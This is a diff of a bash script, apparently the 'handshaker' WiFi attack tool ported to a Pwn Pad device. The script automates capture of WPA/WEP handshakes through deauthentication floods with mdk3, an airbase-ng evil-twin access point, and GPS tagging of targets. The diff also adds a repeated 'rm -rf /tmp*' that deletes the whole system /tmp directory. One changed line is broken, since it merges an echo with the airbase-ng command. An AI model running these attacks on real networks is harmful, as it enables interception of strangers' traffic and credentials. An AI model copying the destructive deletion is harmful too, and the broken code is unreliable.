@@ -12,6 +12,7 @@
 ## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 ## GNU General Public License at (http://www.gnu.org/licenses/) for
 ## more details.
+HOME_PWNPAD="/opt/pwnpad/captures/handshaker"
 
 fhelp()																	#Help
 {
@@ -70,7 +71,7 @@ mdk3
 gpsd 
 cowpatty
 pyrit"
-	if [ $(cat $HOME/handshaker_check | grep user_has_agreed) -z ] 2> /dev/null
+	if [ $(cat $HOME_PWNPAD/handshaker_check | grep user_has_agreed) -z ] 2> /dev/null
 	then
 		echo $RED" [*] DO NOT USE THIS TOOL ON WEBSITES OR USERS UNLESS EXPLICITLY AUTHORIZED TO DO SO."
 		echo $RED" [*] BY USING THIS TOOL YOU AGREE NOT TO BREAK ANY LOCAL OR FEDERAL LAWS WHILE USING THIS TOOL."
@@ -78,10 +79,10 @@ pyrit"
 		read -p " [>] Do you agree? [y/n]:" USE
 		if [ $USE = 'y' ] || [ $USE = 'Y' ]
 		then
-			echo 'user_has_agreed' > $HOME/handshaker_check
+			echo 'user_has_agreed' > $HOME_PWNPAD/handshaker_check
 			clear
 		else
-			echo 'user_has_not__agreed' > $HOME/handshaker_check
+			echo 'user_has_not__agreed' > $HOME_PWNPAD/handshaker_check
 			echo $RST
 			exit
 		fi
@@ -184,9 +185,8 @@ sleep 2
 	fi
 	if [ $OUTDIR -z ] 2> /dev/null
 	then
-		mkdir -p $HOME/Desktop/cap
-		mkdir -p $HOME/Desktop/cap/handshakes
-		OUTDIR=$HOME/Desktop/cap/handshakes
+		mkdir -p $HOME_PWNPAD/handshakes
+		OUTDIR=$HOME_PWNPAD/handshakes
 	else
 		if [ $(echo $OUTDIR | tail -c 2) = '/' ] 2> /dev/null
 		then
@@ -324,25 +324,26 @@ sleep 2
 fapscan()																#Grep for AP ESSID
 {
 	clear
-	rm -rf $HOME/tmp*
+	rm -rf /tmp*
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.." 
+		airodump-ng $MON1 -a -w /tmp -o csv --encrypt $WPW&
 	else
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.."  airodump-ng $MON1 -a -w /tmp -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.."  airodump-ng $MON2 -a -w /tmpe -o csv --encrypt $WPW&
 	fi
 	echo $BLU" [*] Scanning for AP's with names like $GRN$PARTIALESSID$BLU [*] "$RST
 	while [ $DONE -z ] 2> /dev/null
 	do
 		sleep 0.3
-		if [ -f $HOME/tmp-01.csv ] 2> /dev/null
+		if [ -f /tmp-01.csv ] 2> /dev/null
 		then
-			if [ -f $HOME/tmpe-01.csv ]
+			if [ -f /tmpe-01.csv ]
 			then
-				TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | sort -u)"
+				TMPF="$(cat /tmp-01.csv /tmpe-01.csv | sort -u)"
 			else
-				TMPF="$(cat $HOME/tmp-01.csv)"
+				TMPF="$(cat /tmp-01.csv)"
 			fi
 			DONE=$(echo "$TMPF" | grep $PARTIALESSID)
 			ESSID=$(echo "$TMPF" | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
@@ -362,7 +363,7 @@ fapscan()																#Grep for AP ESSID
 	ESSID=${ESSID:1}
 	CHAN=$(echo "$TMPF" | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
-	echo "$TMPF" > $HOME/tmp-01.csv
+	echo "$TMPF" > /tmp-01.csv
 	fclientscan
 }
 
@@ -370,10 +371,13 @@ flistap()																#List all APs
 {
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.."
+		airodump-ng $MON1 -a -w /tmp -o csv --encrypt $WPW&
 	else
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
-		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.."
+		airodump-ng $MON1 -a -w /tmp -o csv --encrypt $WPW&
+		echo "Scanning for $WPW.."
+		airodump-ng $MON2 -a -w /tmpe -o csv --encrypt $WPW&
 	fi
 	clear
 	echo $BLU" [*] Scanning for$GRN All $WPW APs$BLU, Please wait.. "$RED
@@ -381,14 +385,14 @@ flistap()																#List all APs
 	killall airodump-ng
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
+		echo "$(cat /tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > /tmp2
 	else
-		echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
-		echo "$(cat $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 14)" >> $HOME/tmp2
-		UNIQ=$(cat $HOME/tmp2 | sort -u)
-		echo "$UNIQ" > $HOME/tmp2
+		echo "$(cat /tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > /tmp2
+		echo "$(cat /tmpe-01.csv | grep $WPW | cut -d ',' -f 14)" >> /tmp2
+		UNIQ=$(cat /tmp2 | sort -u)
+		echo "$UNIQ" > /tmp2
 	fi
-	LNUM=$(cat $HOME/tmp2 | wc -l)
+	LNUM=$(cat /tmp2 | wc -l)
 	clear
 	echo $BLU" [*] $RED$LNUM$BLU APs found:"$GRN
 	LNUM=0
@@ -396,19 +400,19 @@ flistap()																#List all APs
 	do
 		LNUM=$((LNUM + 1))
 		echo " [$LNUM] $AP"
-	done < $HOME/tmp2
+	done < /tmp2
 
 	echo $BLU" [>] Please choose an AP"
 	read -p "  >" AP
 	echo $RST
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		FCAT=$(cat $HOME/tmp-01.csv)
+		FCAT=$(cat /tmp-01.csv)
 	else
-		FCAT=$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)
-		echo "$FCAT" > $HOME/tmp-01.csv
+		FCAT=$(cat /tmp-01.csv /tmpe-01.csv)
+		echo "$FCAT" > /tmp-01.csv
 	fi
-	ESSID=$(cat $HOME/tmp2 | sed -n "$AP"p)
+	ESSID=$(cat /tmp2 | sed -n "$AP"p)
 	ESSID=${ESSID:1}
 	BSSID=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
 	CHAN=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
@@ -422,11 +426,11 @@ fclientscan()															#Find active clients
 	clear
 	if [ $EVIL = 1 ] 2> /dev/null
 	then
-		CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
+		CIPHER=$(cat /tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
 		CIPHER=${CIPHER:1}
 		MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
 		CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
-		WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
+		WPA=$(cat /tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
 		WPA=${WPA:1}
 		if [ $MIXED = $CIPHER ] 2> /dev/null
 		then
@@ -440,7 +444,7 @@ fclientscan()															#Find active clients
  [*] BSSID:\t\t $GRN$BSSID$RED
  [*] Channel:\t\t $GRN$CHAN$RED"
 	echo
-	rm -rf $HOME/tmp* 2> /dev/null
+	rm -rf /tmp* 2> /dev/null
 	if [ $BESS -z ] 2> /dev/null
 	then
 		echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
@@ -453,10 +457,13 @@ fclientscan()															#Find active clients
 	then
 		if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+			echo "$NIC Sniping $ESSID"
+			airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
 		else
-			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-			gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
+			echo "$NIC Sniping $ESSID"
+			airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
+			echo "$NIC2 Sniping $ESSID"
+			airodump-ng $MON2 --bssid $BSSID -c $CHAN -w /tmpe&
 		fi
 	else
 		case $CIPHER in
@@ -468,16 +475,17 @@ fclientscan()															#Find active clients
 			"WPA2")BARG='-Z '
 		esac
 		PART1=${RANDOM:0:2}
-		gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+		echo "$NIC Sniping $ESSID"
+		airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
 	fi
 	
 	while [ $CLIENT -z ] 2> /dev/null
 	do
 		sleep 0.5
-		CLIENT=$(cat $HOME/tmp-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
+		CLIENT=$(cat /tmp-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
 		if [ $CLIENT -z ] 2> /dev/null
 		then
-				CLIENT=$(cat $HOME/tmpe-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
+				CLIENT=$(cat /tmpe-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
 		fi
 	done
 	fautocap
@@ -522,10 +530,13 @@ fbotstart()																#Startup Autobot
 	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
+		echo "$NIC Scanning for $WPW.."
+		airodump-ng $MON1 -f 400 -a -w /tmp -o csv --encrypt $WPW&
 	else
-		gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
-		gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
+		echo "$NIC Scanning for $WPW.."
+		airodump-ng $MON1 -f 400 -a -w /tmp -o csv --encrypt $WPW&
+		echo "$NIC2 Scanning for $WPW.."
+		airodump-ng $MON2 -f 400 -a -w /tmpe -o csv --encrypt $WPW&
 	fi
 	DONE=""
 	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
@@ -542,13 +553,16 @@ fautobot()																#Automagically find new target clients
 	then
 		killall airodump-ng
 		sleep 0.7
-		rm -rf $HOME/tmp*
+		rm -rf /tmp*
 		if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
+			echo "$NIC Scanning for $WPW.."
+			airodump-ng $MON1 -f 400 -a -w /tmp -o csv --encrypt $WPW&
 		else
-			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
-			gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
+			echo "$NIC Scanning for $WPW.."
+			airodump-ng $MON1 -f 400 -a -w /tmp -o csv --encrypt $WPW&
+			echo "$NIC2 Scanning for $WPW.."
+			airodump-ng $MON2 -f 400 -a -w /tmpe -o csv --encrypt $WPW&
 		fi
 		MNUM=0
 		LNUM=0
@@ -557,30 +571,30 @@ fautobot()																#Automagically find new target clients
 	
 	if [ $WEP -z ] 2> /dev/null
 	then
-		if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
+		if [ ! -f /tmp-01.csv ] 2> /dev/null
 		then
 			sleep 1
 			fautobot
 		else
-			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
+			echo "$(cat /tmp-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > /tmp2
 		fi
-		if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
+		if [ -f /tmpe-01.csv ] 2> /dev/null
 		then
-			echo "$(cat $HOME/tmpe-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
-			UNIQ="$(cat $HOME/tmp2 | sort -u)"
-			echo "$UNIQ" > $HOME/tmp2
+			echo "$(cat /tmpe-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> /tmp2
+			UNIQ="$(cat /tmp2 | sort -u)"
+			echo "$UNIQ" > /tmp2
 		fi
 	else
 		sleep 1
 		if [ $NIC2 -z ] 2> /dev/null
 		then
-			echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
+			echo "$(cat /tmp-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > /tmp2
 		else
-			echo "$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
+			echo "$(cat /tmp-01.csv /tmpe-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > /tmp2
 		fi
 	fi
 
-	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
+	if [ $(cat /tmp2) -z ] 2> /dev/null
 	then
 		RESETCNT=$((RESETCNT + 1))
 		fautobot
@@ -602,7 +616,7 @@ fautobot()																#Automagically find new target clients
 				fi
 			fi
 		fi
-	done < $HOME/tmp2
+	done < /tmp2
 
 	if [ $BSSIDS -z ] 2> /dev/null
 	then
@@ -612,9 +626,9 @@ fautobot()																#Automagically find new target clients
 	BSSIDS=$(echo -e "$BSSIDS" | sort -u)
 	if [ $NIC2 -z ] 2> /dev/null
 	then
-		FCAT="$(cat $HOME/tmp-01.csv)"
+		FCAT="$(cat /tmp-01.csv)"
 	else
-		FCAT="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+		FCAT="$(cat /tmp-01.csv /tmpe-01.csv)"
 	fi
 	if [ $WEP = 1 ] 2> /dev/null
 	then
@@ -699,7 +713,7 @@ fautobot()																#Automagically find new target clients
 	clear
 	echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] "
 	echo
-			echo $GRN""" [*] Client found!:
+	echo $GRN""" [*] Client found!:
  [*] ESSID: $ESSID
  [*] BSSID: $BSSID
  [*] Client: $CLIENT
@@ -732,7 +746,7 @@ fautobot()																#Automagically find new target clients
 		WPA=${WPA:1}
 	fi
 	killall airodump-ng
-	rm -rf $HOME/tmp*
+	rm -rf /tmp*
 	sleep 0.5
 	if [ $NIC2 -z ] 2> /dev/null
 	then
@@ -747,10 +761,13 @@ fautobot()																#Automagically find new target clients
 	then
 		if [ $NIC2 -z ] 2> /dev/null
 		then
-			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+			echo "$NIC Sniping $ESSID" 
+			airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
 		else
-			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-			gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
+			echo "$NIC Sniping $ESSID"
+			airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
+			echo "$NIC2 Sniping $ESSID"
+			airodump-ng $MON2 --bssid $BSSID -c $CHAN -w /tmpe&
 		fi
 	else
 		case $CIPHER in
@@ -761,7 +778,8 @@ fautobot()																#Automagically find new target clients
 			"WPA")BARG='-z ';;
 			"WPA2")BARG='-Z '
 		esac
-		gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+		echo "$NIC Sniping $ESSID"
+		airodump-ng $MON1 --bssid $BSSID -c $CHAN -w /tmp&
 	fi
 	fautocap
 }
@@ -775,13 +793,13 @@ fautocap()																#Deauth targets and collect handshakes
 	fi
 	while [ $DONE -z ] 2> /dev/null
 	do
-		if [ -f $HOME/tmp-01.csv ] 2> /dev/null
+		if [ -f /tmp-01.csv ] 2> /dev/null
 		then
-			TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
+			TARGETS="$(cat /tmp-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
 		fi
-		if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
+		if [ -f /tmpe-01.csv ] 2> /dev/null
 		then
-			TARGETS2="$(cat $HOME/tmpe-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
+			TARGETS2="$(cat /tmpe-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
 			TARGETS="$TARGETS\n$TARGETS2"
 			TARGETS=$(echo -e "$TARGETS" | sort -u)
 		fi
@@ -792,18 +810,18 @@ fautocap()																#Deauth targets and collect handshakes
 		else
 			if [ $NIC2 -z ] 2> /dev/null
 			then
-				TMPF="$(cat $HOME/tmp-01.csv)"
+				TMPF="$(cat /tmp-01.csv)"
 			else
-				TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+				TMPF="$(cat /tmp-01.csv /tmpe-01.csv)"
 			fi
 			for OCLI in $TARGETS
 			do
 				POWER=$(echo "$TMPF" | grep "$OCLI" | cut -d ',' -f 4 | head -n 1)
 				POWER=${POWER:2}
-				echo "$OCLI $POWER" >> $HOME/tmpp
+				echo "$OCLI $POWER" >> /tmpp
 			done
 				
-			POWERLIST="$(cat $HOME/tmpp)"
+			POWERLIST="$(cat /tmpp)"
 			for OCLI in $POWERLIST
 			do
 				if [ $(echo $OCLI | cut -d ' ' -f 2) -le $POWERLIMIT ] 2> /dev/null
@@ -811,7 +829,7 @@ fautocap()																#Deauth targets and collect handshakes
 					echo $(echo $OCLI | cut -d ' ' -f 1) >> tmpff
 				fi
 			done
-			TARGETS="$(cat $HOME/tmpff)"
+			TARGETS="$(cat /tmpff)"
 		fi
 						
 		clear
@@ -859,8 +877,9 @@ fautocap()																#Deauth targets and collect handshakes
 					done
 					sleep 3
 				else
-					echo $BSSID > $HOME/BSSIDB
-					gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
+					echo $BSSID > $HOME_PWNPAD/BSSIDB
+					echo "mdk3 on $NIC" 
+					mdk3 $MON1 d -b $HOME_PWNPAD/BSSIDB&
 					sleep 5 && killall mdk3 2> /dev/null&
 					sleep 8
 				fi
@@ -886,8 +905,9 @@ fautocap()																#Deauth targets and collect handshakes
 						done
 							sleep 3
 					else
-						echo $BSSID > $HOME/BSSIDB
-						gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -c $CHAN -b $HOME/BSSIDB&
+						echo $BSSID > $HOME_PWNPAD/BSSIDB
+						echo "MDK3 on $NIC2" 
+						mdk3 $MON2 d -c $CHAN -b $HOME_PWNPAD/BSSIDB&
 						sleep 5 && killall mdk3 2> /dev/null&
 						sleep 8
 					fi
@@ -898,7 +918,7 @@ fautocap()																#Deauth targets and collect handshakes
 					fi
 					echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
 					FAKEMAC=${BSSID:0:12}'13:37'
-					gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
+					echo "Evil Twin $ESSID listening on $NIC2.."  airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F /tmpe $MON2&
 					sleep 2
 					MACNUM=0
 
@@ -946,7 +966,7 @@ fautocap()																#Deauth targets and collect handshakes
 					else
 						echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL WEP KEY:$WEPKEY" >> $OUTDIR/got
 				fi
-				rm -rf besside.log;rm -rf wep.cap;rm -rf $HOME/tmp* 2> /dev/null;rm -rf wpa.cap 2> /dev/null
+				rm -rf besside.log;rm -rf wep.cap;rm -rf /tmp* 2> /dev/null;rm -rf wpa.cap 2> /dev/null
 				if [ $DO = 'A' ] 2> /dev.null
 				then
 					fbotstart
@@ -959,7 +979,7 @@ fautocap()																#Deauth targets and collect handshakes
 			iw $MON1 set channel $CHAN
 			sleep 0.5
 			besside-ng -W -b $BSSID -c $CHAN $MON1
-			mv wpa.cap $HOME/tmp-01.cap
+			mv wpa.cap /tmp-01.cap
 			fanalyze
 		fi
 	ESSID=$(echo $ESSID | sed 's/ /_/g')
@@ -988,7 +1008,7 @@ fautocap()																#Deauth targets and collect handshakes
 		if [ $EVIL = 1 ] 2> /dev/null
 		then
 			killall airbase-ng 2> /dev/null
-			rm -rf $HOME/tmpe-01.cap
+			rm -rf /tmpe-01.cap
 		fi
 		sleep 0.2
 		DONE=""
@@ -1001,7 +1021,7 @@ fautocap()																#Deauth targets and collect handshakes
 					CHKBASE=""
 					killall airbase-ng 2> /dev/null
 				fi
-				rm -rf $HOME/tmp*
+				rm -rf /tmp*
 				fbotstart
 			else
 				killall airodump-ng
@@ -1032,7 +1052,7 @@ fautocap()																#Deauth targets and collect handshakes
 		if [ $EDONE = 1 ] 2> /dev/null
 		then
 			killall airbase-ng 2> /dev/null
-			cp $HOME/tmpe-01.cap $OUTDIR/$ESSID-$DATE.cap
+			cp /tmpe-01.cap $OUTDIR/$ESSID-$DATE.cap
 		else
 			killall airbase-ng 2> /dev/null
 		fi
@@ -1043,7 +1063,7 @@ fautocap()																#Deauth targets and collect handshakes
 	echo
 	if [ $GPS = 1 ] 2> /dev/null
 	then
-		if [ $(cat $HOME/gpslog | grep LL) -z ] 2> /dev/null
+		if [ $(cat $HOME_PWNPAD/gpslog | grep LL) -z ] 2> /dev/null
 		then
 			echo $RED" [*] GPS Not ready yet!"
 			echo
@@ -1062,14 +1082,14 @@ fautocap()																#Deauth targets and collect handshakes
 
 		if [ $EDONE -z ] 2> /dev/null
 		then
-			echo $GRN" [*] $(pyrit -r $HOME/tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
+			echo $GRN" [*] $(pyrit -r /tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
 		else
-			echo $GRN" [*] $(pyrit -r $HOME/tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
+			echo $GRN" [*] $(pyrit -r /tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
 		fi
 	fi
 	sleep 0.4
 	EDONE="";GDONE="";TARGETS="";BSSIDS="";LOCATION="";URL=""
-	rm -rf $HOME/tmp*
+	rm -rf /tmp*
 	sleep 2
 	if [ $DO = 'A' ] 2> /dev.null
 	then
@@ -1095,9 +1115,9 @@ fautocap()																#Deauth targets and collect handshakes
 fanalyze()																#Analyze pcap for handshakes
 {
 	GDONE="";EDONE="";ANALYZE="";ANALYZE2=""
-	if [ -f $HOME/tmp-01.cap ] 2> /dev/null
+	if [ -f /tmp-01.cap ] 2> /dev/null
 	then
-		ANALYZE=$(cowpatty -r $HOME/tmp-01.cap -c)
+		ANALYZE=$(cowpatty -r /tmp-01.cap -c)
 	else
 		ANALYZE='fff'
 	fi
@@ -1105,9 +1125,9 @@ fanalyze()																#Analyze pcap for handshakes
 	then
 		A=1
 	else
-		if [ -f $HOME/tmpe-01.cap ] 2> /dev/null
+		if [ -f /tmpe-01.cap ] 2> /dev/null
 		then
-			ANALYZE2=$(cowpatty -r $HOME/tmpe-01.cap -c)
+			ANALYZE2=$(cowpatty -r /tmpe-01.cap -c)
 		else
 			ANALYZE2='fff'
 		fi
@@ -1176,12 +1196,12 @@ fstartgps()																#Configure GPS
 	echo
 	echo $BLU" [*] Checking GPS status"
 	PHONEIP=$(route -n | grep Gate -A 1 | grep 0 | cut -d '0' -f 5 | sed 's/^ *//g')
-	gpspipe -d -r "$PHONEIP:4352" -o $HOME/gpslog&
+	gpspipe -d -r "$PHONEIP:4352" -o $HOME_PWNPAD/gpslog&
 	LCNT=0
 	while [ $LDONE -z ] 2> /dev/null
 	do
 		sleep 0.4
-		LDONE=$(cat $HOME/gpslog)
+		LDONE=$(cat $HOME_PWNPAD/gpslog)
 		LCNT=$((LCNT + 1))
 		if [ $LCNT -ge 25 ] 2> /dev/null
 		then
@@ -1199,7 +1219,7 @@ fstartgps()																#Configure GPS
 	
 fgetgps()
 {
-	LOCATION=$(cat $HOME/gpslog | grep LL | tail -1 | cut -d ',' -f 2-5)
+	LOCATION=$(cat $HOME_PWNPAD/gpslog | grep LL | tail -1 | cut -d ',' -f 2-5)
 	MINS1=$(echo $LOCATION | cut -d '.' -f 1 | tail -c 3)
 	DEGS1=$(echo $LOCATION | cut -d '.' -f 1)
 	DEGS1=${DEGS1:0:-2}
@@ -1275,7 +1295,7 @@ fexit()																	#Exit
 	killall airbase-ng 2> /dev/null
 	killall airodump-ng 2> /dev/null
 	killall besside-ng 2> /dev/null
-	rm -rf $HOME/tmp* 2> /dev/null
+	rm -rf /tmp* 2> /dev/null
 	rm -rf besside.log 2> /dev/null
 	rm -rf wep.cap 2> /dev/null
 	rm -rf wpa.cap 2> /dev/null
@@ -1300,9 +1320,9 @@ fexit()																	#Exit
 		if [ $GPS = 1 ] 2> /dev/null
 		then	
 			killall -9 gpspipe 2> /dev/null
-			rm -rf $HOME/gpslog
+			rm -rf $HOME_PWNPAD/gpslog
 			echo $RED" [*]$GRN Android GPS$RED shutting down..."
-			rm -rf $HOME/BSSIDF 2> /dev/null
+			rm -rf $HOME_PWNPAD/BSSIDF 2> /dev/null
 			echo
 		else
 			/etc/init.d/networking start
